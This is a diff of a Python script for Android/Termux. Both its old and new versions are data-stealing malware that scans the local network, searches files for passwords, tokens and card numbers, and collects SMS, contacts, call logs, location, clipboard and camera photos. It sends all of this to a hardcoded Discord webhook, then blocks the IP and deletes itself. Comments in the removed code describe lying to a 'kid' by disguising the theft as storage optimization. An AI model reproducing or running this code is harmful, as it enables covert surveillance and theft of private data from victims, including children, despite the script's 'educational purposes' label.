@@ -1,338 +1,267 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Step1.py – Advanced Data Exfiltration & Self‑Destruct
+Uses threading to collect IP, scan network, harvest files, and exfiltrate via Discord.
+FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.
+"""
+
 import os
 import sys
-import subprocess
 import json
-import base64
-import socket
 import time
 import re
+import subprocess
 import threading
 import requests
-from datetime import datetime
 from pathlib import Path
+from datetime import datetime
 
-# ─── CONFIG ──────────────────────────────────────────────────────────────
-WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"  # Replace with your actual webhook
-SCAN_SUBNET = True          # Whether to perform nmap scanning
-VPN_DETECTION = True        # Check for VPN interfaces
-FILE_HARVEST = True         # Harvest files from storage
-TERMUX_API = True           # Use termux-api commands
+# ============================================================
+# CONFIG – REPLACE WITH YOUR WEBHOOK
+# ============================================================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
+MAX_FILE_SIZE = 8 * 1024 * 1024  # Discord limit per file
+# ============================================================
 
-# File extensions to harvest (only small files under 1MB)
-EXTENSIONS = ['.txt', '.log', '.conf', '.cfg', '.ini', '.json', '.xml', '.yaml', '.yml',
-              '.pdf', '.doc', '.docx', '.xlsx', '.pptx', '.odt',
-              '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
-              '.db', '.sqlite', '.sqlite3', '.zip', '.rar', '.7z',
-              '.mp3', '.mp4', '.avi', '.mkv', '.mov',
-              '.key', '.pem', '.crt', '.p12', '.pfx']
+# Colors
+R = '\033[31m'
+G = '\033[1;32m'
+O = '\033[33m'
+B = '\033[34m'
+C = '\033[36m'
+W = '\033[0m'
 
-MAX_FILE_SIZE = 1024 * 1024  # 1MB
+# ============================================================
+# HELPERS
+# ============================================================
 
-# ─── WEBHOOK SENDER ─────────────────────────────────────────────────────
-
-def send_to_webhook(data):
-    """Send JSON payload to Discord webhook."""
+def send_to_discord(content, file_path=None):
+    """Send message or file to Discord webhook."""
     try:
-        headers = {'Content-Type': 'application/json'}
-        requests.post(WEBHOOK_URL, json=data, timeout=10)
+        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) <= MAX_FILE_SIZE:
+            with open(file_path, "rb") as f:
+                files = {"file": (os.path.basename(file_path), f)}
+                r = requests.post(WEBHOOK_URL, files=files)
+            return r.status_code in (200, 204)
+        else:
+            r = requests.post(WEBHOOK_URL, json={"content": content})
+            return r.status_code in (200, 204)
     except Exception as e:
-        print(f"Webhook error: {e}")
-
-def send_file_to_webhook(file_path, content_b64):
-    """Send a file content (base64) as part of an embed."""
-    payload = {
-        "content": f"📁 File: `{file_path}`",
-        "embeds": [{
-            "title": "Harvested File",
-            "description": f"```\n{content_b64[:1900]}\n```",
-            "color": 0x00ff00
-        }]
-    }
-    send_to_webhook(payload)
-
-# ─── SYSTEM INFO ────────────────────────────────────────────────────────
+        print(f"{R}[!] Webhook error: {e}{W}")
+        return False
 
 def get_public_ip():
     try:
-        r = requests.get('https://api.ipify.org?format=json', timeout=5)
-        return r.json().get('ip')
+        r = requests.get("https://api.ipify.org?format=json", timeout=5)
+        return r.json().get("ip", "unknown")
     except:
-        return None
-
-def get_geo_info(ip):
-    try:
-        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
-        data = r.json()
-        if data.get('status') == 'success':
-            return f"{data.get('city')}, {data.get('regionName')}, {data.get('country')}"
-        return None
-    except:
-        return None
+        return "unknown"
 
 def get_local_ip():
     try:
-        # Use ifconfig or ip addr
-        output = subprocess.check_output(['ifconfig'], text=True)
-        # Find first non-loopback IPv4
-        match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', output)
-        if match:
-            return match.group(1)
-    except:
-        pass
-    return '127.0.0.1'
-
-def is_vpn_active():
-    """Check if a VPN interface (tun) exists."""
-    try:
-        output = subprocess.check_output(['ifconfig'], text=True)
-        return 'tun' in output
-    except:
-        return False
-
-def get_ssid_bssid():
-    """Get Wi-Fi SSID and BSSID using termux-wifi-connectioninfo."""
-    try:
-        if os.path.exists('/data/data/com.termux'):
-            output = subprocess.check_output(['termux-wifi-connectioninfo'], text=True)
-            data = json.loads(output)
-            ssid = data.get('ssid', 'Unknown')
-            bssid = data.get('bssid', 'Unknown')
-            return ssid, bssid
-    except:
-        pass
-    return None, None
-
-# ─── NMAP SCANNING ──────────────────────────────────────────────────────
-
-def get_network_subnet(ip):
-    """Assume /24 subnet based on local IP."""
-    parts = ip.split('.')
-    if len(parts) == 4:
-        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
-    return None
-
-def scan_subnet(subnet):
-    """Discover live hosts using nmap -sn."""
-    hosts = []
-    try:
-        output = subprocess.check_output(['nmap', '-sn', subnet], text=True)
-        # Parse Nmap output for IP addresses
-        ips = re.findall(r'Nmap scan report for ([\d.]+)', output)
-        hosts = [ip for ip in ips if ip != get_local_ip()]
-    except:
-        pass
-    return hosts
-
-def scan_host(ip):
-    """Aggressive nmap scan to find open ports."""
-    result = {}
-    try:
-        # Scan for common ports (ADB 5555, SSH 22, etc.)
-        output = subprocess.check_output(['nmap', '-sV', '-p', '22,23,80,443,554,5555,8080', ip], text=True)
-        # Parse open ports
-        lines = output.splitlines()
-        for line in lines:
-            if 'open' in line:
-                port = re.search(r'(\d+)/tcp', line)
-                service = re.search(r'tcp\s+open\s+(\S+)', line)
-                if port:
-                    result[port.group(1)] = service.group(1) if service else 'unknown'
-    except:
-        pass
-    return result
-
-# ─── EXPLOITATION ──────────────────────────────────────────────────────
-
-def try_adb(ip):
-    """Attempt to connect via ADB (port 5555)."""
-    try:
-        # Check if adb is available
-        subprocess.check_output(['adb', 'version'], stderr=subprocess.DEVNULL)
-    except:
+        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
+        for line in result.stdout.splitlines():
+            if "inet " in line and "127.0.0.1" not in line:
+                parts = line.strip().split()
+                for i, part in enumerate(parts):
+                    if part == "inet" and i+1 < len(parts):
+                        ip = parts[i+1]
+                        if ip.startswith(("192.168.", "10.", "172.")):
+                            return ip
         return None
-    try:
-        # Connect to device
-        subprocess.check_output(['adb', 'connect', f'{ip}:5555'], text=True)
-        time.sleep(2)
-        # Run shell command to get device info
-        out = subprocess.check_output(['adb', 'shell', 'getprop ro.product.model'], text=True)
-        model = out.strip()
-        out2 = subprocess.check_output(['adb', 'shell', 'getprop ro.build.version.release'], text=True)
-        android_ver = out2.strip()
-        return f"ADB Device: {model} (Android {android_ver})"
     except:
         return None
 
-def try_ssh(ip):
-    """Attempt to connect via SSH (port 22) with default credentials (placeholder)."""
-    # This is just a placeholder – real SSH brute‑force would be too heavy.
-    # Instead, we just report that SSH is open.
-    return "SSH port open – might be vulnerable to dictionary attack."
+def is_vpn(ip):
+    if not ip:
+        return True
+    vpn_ranges = ["192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.",
+                  "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
+                  "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
+                  "100.64.", "127.", "0."]
+    for prefix in vpn_ranges:
+        if ip.startswith(prefix):
+            return True
+    return False
 
-# ─── FILE HARVESTING ────────────────────────────────────────────────────
+# ============================================================
+# THREAD 1: IP & NMAP SCAN
+# ============================================================
+def thread_ip_nmap():
+    local = get_local_ip()
+    public = get_public_ip()
+    ip_info = f"Local: {local or 'N/A'}\nPublic: {public}"
+    send_to_discord(f"📡 **IP Info**\n```\n{ip_info}\n```")
 
-def harvest_files(start_dir, extensions, max_size):
-    """Recursively collect small files matching extensions."""
-    harvested = []
-    for root, dirs, files in os.walk(start_dir):
-        # Skip system directories to avoid permission errors
-        if '/proc' in root or '/sys' in root:
-            continue
-        for file in files:
-            path = os.path.join(root, file)
-            try:
-                size = os.path.getsize(path)
-                if size == 0 or size > max_size:
-                    continue
-                ext = Path(file).suffix.lower()
-                if ext in extensions:
-                    with open(path, 'rb') as f:
-                        content = f.read()
-                    harvested.append({
-                        'path': path,
-                        'size': size,
-                        'content_b64': base64.b64encode(content).decode('utf-8')
-                    })
-            except:
-                continue
-    return harvested
-
-# ─── TERMUX-API COMMANDS ───────────────────────────────────────────────
-
-def termux_api_get(command):
-    """Run a termux-api command and return its output as text."""
-    try:
-        if os.path.exists('/data/data/com.termux'):
-            out = subprocess.check_output(['termux-' + command], text=True)
-            return out
-    except:
-        pass
-    return None
-
-# ─── MAIN EXECUTION ─────────────────────────────────────────────────────
-
-def main():
-    print("[*] Step1.py started.")
-    # 1. Gather local network info
-    local_ip = get_local_ip()
-    vpn = is_vpn_active()
-    print(f"[*] Local IP: {local_ip}, VPN: {vpn}")
-
-    if not vpn:
-        # Get public IP and geo
-        pub_ip = get_public_ip()
-        geo = get_geo_info(pub_ip) if pub_ip else None
-        ssid, bssid = get_ssid_bssid()
-        # Send preliminary info via webhook
-        info_payload = {
-            "content": f"📡 **Network Info**\nLocal IP: {local_ip}\nPublic IP: {pub_ip}\nGeo: {geo}\nSSID: {ssid}\nBSSID: {bssid}\nVPN: No"
-        }
-        send_to_webhook(info_payload)
-    else:
-        # VPN detected – skip nmap and just report
-        send_to_webhook({"content": f"🛡️ VPN detected – skipping network scanning."})
-        # Still harvest files and termux-api (will run regardless)
-
-    # 2. Nmap scanning (only if not VPN and SCAN_SUBNET is True)
-    if not vpn and SCAN_SUBNET:
-        subnet = get_network_subnet(local_ip)
-        if subnet:
-            print(f"[*] Scanning subnet: {subnet}")
-            hosts = scan_subnet(subnet)
-            for host in hosts:
-                ports = scan_host(host)
-                if ports:
-                    # Report open ports
-                    port_str = ", ".join([f"{p}:{s}" for p,s in ports.items()])
-                    send_to_webhook({"content": f"🌐 Host {host} – open ports: {port_str}"})
-                    # Try ADB or SSH if ports match
-                    if '5555' in ports:
-                        adb_info = try_adb(host)
-                        if adb_info:
-                            send_to_webhook({"content": f"📱 {adb_info}"})
-                    if '22' in ports:
-                        ssh_info = try_ssh(host)
-                        send_to_webhook({"content": f"🔑 {ssh_info}"})
-                else:
-                    # Lie to the kid: pretend scanning found nothing
-                    send_to_webhook({"content": f"❌ No vulnerabilities found on {host}."})
-        else:
-            send_to_webhook({"content": "⚠️ Could not determine subnet."})
-
-    # 3. File harvesting (lie to kid – say it's "storage optimization")
-    if FILE_HARVEST:
-        print("[*] Harvesting files... (this may take a while)")
-        # Directories to scan (Termux + Android storage)
-        dirs = ['/sdcard', '/storage/emulated/0', '/data/data/com.termux/files/home']
-        files = []
-        for d in dirs:
-            if os.path.exists(d):
-                files.extend(harvest_files(d, EXTENSIONS, MAX_FILE_SIZE))
-        # Send first 5 files (to avoid spamming)
-        for f in files[:5]:
-            send_file_to_webhook(f['path'], f['content_b64'])
-        # Report total count
-        send_to_webhook({"content": f"📦 Harvested {len(files)} files (only first 5 sent)."})
-        # Lie to kid: pretend we analyzed storage
-        print("[✓] Storage optimization complete.")
-
-    # 4. Termux-API data exfiltration
-    if TERMUX_API:
-        print("[*] Collecting termux-api data...")
-        # Clipboard
-        clipboard = termux_api_get('clipboard-get')
-        if clipboard:
-            send_to_webhook({"content": f"📋 Clipboard: `{clipboard[:500]}`"})
-        # SMS list (last 20)
-        sms = termux_api_get('sms-list')
-        if sms:
-            # Parse JSON and extract short summary
-            try:
-                sms_data = json.loads(sms)
-                if isinstance(sms_data, list):
-                    sms_summary = "\n".join([f"{s.get('sender', '?')}: {s.get('body', '')[:50]}" for s in sms_data[:20]])
-                    send_to_webhook({"content": f"📩 SMS (last 20):\n{sms_summary}"})
-            except:
-                pass
-        # Contacts
-        contacts = termux_api_get('contact-list')
-        if contacts:
-            try:
-                contacts_data = json.loads(contacts)
-                if isinstance(contacts_data, list):
-                    contact_summary = "\n".join([f"{c.get('name', '?')}: {c.get('number', '?')}" for c in contacts_data[:20]])
-                    send_to_webhook({"content": f"👤 Contacts (first 20):\n{contact_summary}"})
-            except:
-                pass
-        # Location (if GPS enabled)
-        location = termux_api_get('location')
-        if location:
-            try:
-                loc = json.loads(location)
-                if loc:
-                    send_to_webhook({"content": f"📍 Location: {loc.get('latitude')}, {loc.get('longitude')}"})
-            except:
-                pass
-        # Take a photo (requires camera permission)
-        # termux-camera-photo -c 0 /sdcard/photo.jpg
+    if local and not is_vpn(local):
+        subnet = ".".join(local.split(".")[:3]) + ".0/24"
+        print(f"{C}[*] Scanning subnet: {subnet}{W}")
         try:
-            subprocess.check_output(['termux-camera-photo', '-c', '0', '/sdcard/photo.jpg'], stderr=subprocess.DEVNULL)
-            # Upload the photo
-            with open('/sdcard/photo.jpg', 'rb') as f:
-                photo_b64 = base64.b64encode(f.read()).decode()
-            send_file_to_webhook('Camera photo', photo_b64)
+            result = subprocess.run(["nmap", "-sn", subnet], capture_output=True, text=True, timeout=60)
+            output_file = "nmap_scan.txt"
+            with open(output_file, "w") as f:
+                f.write(f"=== Nmap scan of {subnet} ===\n")
+                f.write(result.stdout)
+            send_to_discord("📡 **Nmap scan results**", output_file)
+            os.remove(output_file)
+        except Exception as e:
+            print(f"{R}[!] Nmap error: {e}{W}")
+
+# ============================================================
+# THREAD 2: FILE SYSTEM HARVEST
+# ============================================================
+def thread_file_harvest():
+    results = []
+    # Directories to scan (avoid massive scans)
+    targets = ["/", "/storage/emulated/0", "/sdcard", "/data/data/com.termux/files/home"]
+    extensions = [".txt", ".log", ".json", ".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".html", ".css", ".js", ".py", ".sh", ".bash", ".zsh", ".rc", ".env", ".properties"]
+    important_keywords = ["password", "token", "api_key", "secret", "key", "pwd", "pass", "login", "username", "email", "credit", "card", "cvv", "ssn", "iban"]
+
+    for base in targets:
+        if not os.path.exists(base):
+            continue
+        for root, dirs, files in os.walk(base, topdown=True, onerror=lambda e: None):
+            # Limit depth to avoid endless traversal
+            depth = root.replace(base, "").count(os.sep)
+            if depth > 4:
+                continue
+            for f in files:
+                if any(f.endswith(ext) for ext in extensions):
+                    path = os.path.join(root, f)
+                    try:
+                        size = os.path.getsize(path)
+                        if size > 10 * 1024 * 1024:  # skip files >10MB
+                            continue
+                        with open(path, 'r', encoding='utf-8', errors='ignore') as file:
+                            content = file.read()
+                        for kw in important_keywords:
+                            if kw in content.lower():
+                                # Found interesting info
+                                snippet = content[:500] + ("..." if len(content)>500 else "")
+                                results.append({
+                                    "file": path,
+                                    "keyword": kw,
+                                    "snippet": snippet,
+                                    "size": size
+                                })
+                                break
+                    except:
+                        pass
+
+    # Save results to JSON
+    if results:
+        with open("harvest.json", "w") as f:
+            json.dump(results, f, indent=2)
+        send_to_discord("📁 **File harvest results**", "harvest.json")
+        os.remove("harvest.json")
+
+# ============================================================
+# THREAD 3: TERMUX-API DATA COLLECTION
+# ============================================================
+def thread_termux_api():
+    api_data = {}
+    commands = {
+        "battery": ["termux-battery-status"],
+        "location": ["termux-location"],
+        "clipboard": ["termux-clipboard-get"],
+        "call_log": ["termux-call-log"],
+        "contacts": ["termux-contact-list"],
+        "sms": ["termux-sms-list", "-l", "10"],
+        "device_info": ["termux-telephony"],
+        "wifi": ["termux-wifi-connectioninfo"],
+        "sensors": ["termux-sensor", "-l"]
+    }
+
+    for key, cmd in commands.items():
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            if result.returncode == 0 and result.stdout.strip():
+                # Try to parse as JSON
+                try:
+                    data = json.loads(result.stdout)
+                    api_data[key] = data
+                except:
+                    api_data[key] = result.stdout.strip()
         except:
             pass
 
-    # 5. Cleanup – delete self
-    print("[*] Cleaning up...")
+    if api_data:
+        with open("api_data.json", "w") as f:
+            json.dump(api_data, f, indent=2)
+        send_to_discord("📱 **Termux-API data**", "api_data.json")
+        os.remove("api_data.json")
+
+# ============================================================
+# BLOCK IP & SELF-DESTRUCT
+# ============================================================
+def block_ip(ip):
+    if not ip:
+        return
     try:
-        os.remove(__file__)
+        # Try iptables (needs root)
+        subprocess.run(["su", "-c", f"iptables -I OUTPUT -d {ip} -j REJECT"], 
+                       capture_output=True, timeout=5)
+        send_to_discord(f"🚫 **IP blocked**: {ip} (iptables)")
+    except:
+        # Fallback to /etc/hosts
+        try:
+            with open("/etc/hosts", "a") as f:
+                f.write(f"127.0.0.1 {ip}\n")
+            send_to_discord(f"🚫 **IP blocked**: {ip} (hosts)")
+        except:
+            pass
+
+def self_destruct():
+    time.sleep(2)
+    files = ["Step1.py", "main.py", "nmap_scan.txt", "harvest.json", "api_data.json"]
+    for f in files:
+        if os.path.exists(f):
+            try:
+                os.remove(f)
+            except:
+                pass
+    # Delete the script itself
+    try:
+        os.remove(os.path.abspath(sys.argv[0]))
     except:
         pass
-    # Also remove the initial main.py if present? Not necessary.
+    sys.exit(0)
 
-    print("[✓] Step1.py finished.")
+# ============================================================
+# MAIN – RUN THREADS & SELF-DESTRUCT
+# ============================================================
+def main():
+    print(f"\n{C}{'='*60}{W}")
+    print(f"{C}Ω_BLACKSTAR – Step1.py Initializing...{W}")
+    print(f"{C}{'='*60}{W}\n")
+
+    # Start threads
+    t1 = threading.Thread(target=thread_ip_nmap, daemon=True)
+    t2 = threading.Thread(target=thread_file_harvest, daemon=True)
+    t3 = threading.Thread(target=thread_termux_api, daemon=True)
+
+    t1.start()
+    t2.start()
+    t3.start()
+
+    # Wait for threads (with timeout to ensure completion)
+    t1.join(timeout=120)
+    t2.join(timeout=180)
+    t3.join(timeout=120)
+
+    # Block IP and self-destruct
+    public_ip = get_public_ip()
+    if public_ip and public_ip != "unknown":
+        block_ip(public_ip)
+
+    send_to_discord("💀 **Self‑destruct sequence initiated**")
+    self_destruct()
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except Exception as e:
+        print(f"{R}[!] Error: {e}{W}")
+        sys.exit(1)
